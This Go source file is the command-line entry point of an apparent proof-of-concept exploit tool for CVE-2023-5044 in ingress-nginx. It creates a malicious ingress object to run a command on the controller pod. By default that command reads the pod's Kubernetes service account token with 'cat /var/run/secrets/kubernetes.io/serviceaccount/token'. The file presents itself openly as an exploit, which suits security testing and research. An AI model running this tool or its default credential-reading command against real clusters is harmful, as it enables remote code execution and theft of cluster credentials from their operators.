package cmd

import (
	"os"

	"github.com/spf13/cobra"
	"k8s.io/cli-runtime/pkg/genericclioptions"
	"k8s.io/client-go/kubernetes/scheme"
)

var (
	rootCmd = &cobra.Command{
		Use:          "cve-2023-5044",
		Short:        "Exploit CVE-2023-5044",
		Long:         "Create an ingress object that exploits CVE-2023-5044",
		SilenceUsage: true,
	}
)

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootrootCmd.
func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	o := &Options{
		ConfigFlags: genericclioptions.NewConfigFlags(true),
		PrintFlags:  genericclioptions.NewPrintFlags("").WithDefaultOutput("yaml").WithTypeSetter(scheme.Scheme),
		IOStreams:   genericclioptions.IOStreams{In: os.Stdin, Out: os.Stdout, ErrOut: os.Stderr},
	}

	rootCmd.AddCommand(GenerateCmd(o))
	rootCmd.AddCommand(RunCmd(o))

	rootCmd.Flags().StringVarP(&o.IngressObjectNamePrefix, "ingress-name", "i", "forearmed-poc-", "Prefix for the ingress object to create.")
	rootCmd.Flags().StringVarP(&o.RedirectPath, "redirect-path", "r", "4armed", "Path used for exploit.")
	rootCmd.Flags().StringVarP(&o.ExploitCommand, "execute", "e", "cat /var/run/secrets/kubernetes.io/serviceaccount/token", "Command to execute on the ingress-nginx controller pod.")
	o.ConfigFlags.AddFlags(rootCmd.Flags())
}
